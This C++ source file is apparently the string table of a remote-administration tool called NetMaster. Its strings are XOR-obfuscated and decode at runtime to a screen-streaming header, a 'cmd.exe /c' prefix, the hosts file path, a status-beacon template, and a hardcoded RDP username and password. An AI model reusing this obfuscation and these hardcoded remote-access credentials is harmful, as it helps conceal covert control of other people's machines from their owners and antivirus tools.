#include"Globals.h"
#include<map>
#include<vector>
#include <locale>
#include <codecvt>
namespace Strings {

	unsigned char key_str = 0x77;
	std::map<std::string, std::vector<unsigned char>> strings;
	

	void StrDc() {
		
		for (auto& pair : strings) {
			
			for (size_t i = 0; i < pair.second.size(); i++) {

				pair.second[i] = pair.second[i] ^ key_str;
			}
		}

	}

	void StringsInit() {

		strings["ScreenShareHdr"] = { 0x5a,0x5a,0x15,0x18,0x02,0x19,0x13,0x16,0x05,0x0e,0x7a,0x7d,0x34,0x18,0x19,0x03,0x12,0x19,0x03,0x5a,0x23,0x0e,0x07,0x12,0x4d,0x57,0x1e,0x1a,0x16,0x10,0x12,0x58,0x1d,0x07,0x12,0x10,0x7a,0x7d,0x7a,0x7d };
		strings["newl"] = { 0x7a,0x7d };
		strings["hostsfilea"] = { 0x52,0x00,0x1e,0x19,0x13,0x1e,0x05,0x52,0x2b,0x24,0x0e,0x04,0x03,0x12,0x1a,0x44,0x45,0x2b,0x13,0x05,0x1e,0x01,0x12,0x05,0x04,0x2b,0x12,0x03,0x14,0x2b,0x1f,0x18,0x04,0x03,0x04,0x77 };
		strings["updatepost"] = { 0x1e,0x13,0x4a,0x52,0x04,0x51,0x1b,0x18,0x14,0x1c,0x12,0x13,0x4a,0x52,0x04,0x51,0x15,0x16,0x19,0x13,0x05,0x12,0x14,0x4a,0x52,0x04,0x51,0x15,0x16,0x19,0x13,0x04,0x12,0x19,0x03,0x4a,0x52,0x04,0x51,0x14,0x07,0x02,0x1b,0x18,0x16,0x13,0x4a,0x52,0x04,0x51,0x00,0x1e,0x19,0x13,0x18,0x00,0x4a,0x52,0x04,0x51,0x1e,0x13,0x1b,0x12,0x4a,0x52,0x04,0x77 };
		strings["postinit"] = { 0x1e,0x13,0x4a,0x52,0x04,0x51,0x19,0x16,0x1a,0x12,0x4a,0x52,0x04,0x77 };
		strings["cmd"] = { 0x14,0x1a,0x13,0x59,0x12,0x0f,0x12,0x57,0x58,0x14,0x57,0x77 };
		strings["config"] = { 0x34,0x4d,0x2b,0x27,0x05,0x18,0x10,0x05,0x16,0x1a,0x33,0x16,0x03,0x16,0x2b,0x39,0x12,0x03,0x3a,0x16,0x04,0x03,0x12,0x05,0x2b,0x14,0x18,0x19,0x11,0x1e,0x10,0x59,0x1e,0x19,0x1e,0x77 };
		strings["rdpusr"] = { 0x19,0x77,0x12,0x77,0x03,0x77,0x1a,0x77,0x16,0x77,0x04,0x77,0x03,0x77,0x12,0x77,0x05,0x77,0x77,0x77 };
		strings["pwdrdp"] = { 0x05,0x77,0x13,0x77,0x07,0x77,0x59,0x77,0x11,0x77,0x44,0x77,0x13,0x77,0x1e,0x77,0x47,0x77,0x47,0x77,0x41,0x77,0x77,0x77 };
		strings["abt"] = { 0x57,0x77,0x57,0x77,0x57,0x77,0x57,0x77,0x57,0x77,0x57,0x77,0x57,0x77,0x57,0x77,0x57,0x77,0x57,0x77,0x57,0x77,0x57,0x77,0x57,0x77,0x57,0x77,0x57,0x77,0x57,0x77,0x57,0x77,0x57,0x77,0x57,0x77,0x57,0x77,0x57,0x77,0x57,0x77,0x57,0x77,0x57,0x77,0x57,0x77,0x57,0x77,0x57,0x77,0x57,0x77,0x57,0x77,0x57,0x77,0x57,0x77,0x57,0x77,0x57,0x77,0x39,0x77,0x12,0x77,0x03,0x77,0x3a,0x77,0x16,0x77,0x04,0x77,0x03,0x77,0x12,0x77,0x05,0x77,0x57,0x77,0x01,0x77,0x46,0x77,0x59,0x77,0x47,0x77,0x57,0x77,0x5a,0x77,0x5a,0x77,0x5a,0x77,0x57,0x77,0x1f,0x77,0x03,0x77,0x03,0x77,0x07,0x77,0x04,0x77,0x4d,0x77,0x58,0x77,0x58,0x77,0x10,0x77,0x1e,0x77,0x03,0x77,0x1f,0x77,0x02,0x77,0x15,0x77,0x59,0x77,0x14,0x77,0x18,0x77,0x1a,0x77,0x58,0x77,0x11,0x77,0x44,0x77,0x13,0x77,0x1e,0x77,0x47,0x77,0x47,0x77,0x41,0x77,0x58,0x77,0x39,0x77,0x12,0x77,0x03,0x77,0x3a,0x77,0x16,0x77,0x04,0x77,0x03,0x77,0x12,0x77,0x05,0x77,0x57,0x77,0x5a,0x77,0x5a,0x77,0x5a,0x77,0x7d,0x77,0x4a,0x77,0x4a,0x77,0x4a,0x77,0x4a,0x77,0x4a,0x77,0x4a,0x77,0x4a,0x77,0x4a,0x77,0x4a,0x77,0x4a,0x77,0x4a,0x77,0x4a,0x77,0x4a,0x77,0x4a,0x77,0x4a,0x77,0x4a,0x77,0x4a,0x77,0x4a,0x77,0x4a,0x77,0x4a,0x77,0x4a,0x77,0x4a,0x77,0x4a,0x77,0x4a,0x77,0x4a,0x77,0x4a,0x77,0x4a,0x77,0x4a,0x77,0x4a,0x77,0x4a,0x77,0x4a,0x77,0x4a,0x77,0x4a,0x77,0x4a,0x77,0x4a,0x77,0x4a,0x77,0x4a,0x77,0x4a,0x77,0x4a,0x77,0x4a,0x77,0x4a,0x77,0x4a,0x77,0x4a,0x77,0x4a,0x77,0x4a,0x77,0x4a,0x77,0x4a,0x77,0x4a,0x77,0x4a,0x77,0x4a,0x77,0x4a,0x77,0x4a,0x77,0x4a,0x77,0x4a,0x77,0x4a,0x77,0x4a,0x77,0x4a,0x77,0x4a,0x77,0x4a,0x77,0x4a,0x77,0x4a,0x77,0x4a,0x77,0x4a,0x77,0x4a,0x77,0x4a,0x77,0x4a,0x77,0x4a,0x77,0x4a,0x77,0x4a,0x77,0x4a,0x77,0x4a,0x77,0x4a,0x77,0x4a,0x77,0x4a,0x77,0x4a,0x77,0x4a,0x77,0x4a,0x77,0x4a,0x77,0x4a,0x77,0x4a,0x77,0x4a,0x77,0x4a,0x77,0x4a,0x77,0x4a,0x77,0x4a,0x77,0x4a,0x77,0x4a,0x77,0x4a,0x77,0x4a,0x77,0x4a,0x77,0x4a,0x77,0x4a,0x77,0x4a,0x77,0x4a,0x77,0x4a,0x77,0x4a,0x77,0x4a,0x77,0x4a,0x77,0x4a,0x77,0x4a,0x77,0x4a,0x77,0x4a,0x77,0x4a,0x77,0x4a,0x77,0x4a,0x77,0x7d,0x77,0x77,0x77 };
		StrDc();


	}
	std::string GetStr(const char* key) {
		if (strings.find(key) == strings.end()) { return ""; }
		std::vector<unsigned char> str = strings[key];
		return std::string(str.begin(), str.end());


	}

	std::vector<unsigned char> GetVect(const char* key) {
		if (strings.find(key) == strings.end()) { return {}; }
		std::vector<unsigned char> str = strings[key];
		return str;

	}


	std::wstring strtow(const std::string& narrowString) {
		std::wstring_convert<std::codecvt_utf8<wchar_t>> converter;
		return converter.from_bytes(narrowString);
	}
	std::string wtostr(const std::wstring& wideString) {
		std::wstring_convert<std::codecvt_utf8<wchar_t>> converter;
		return converter.to_bytes(wideString);
	}


}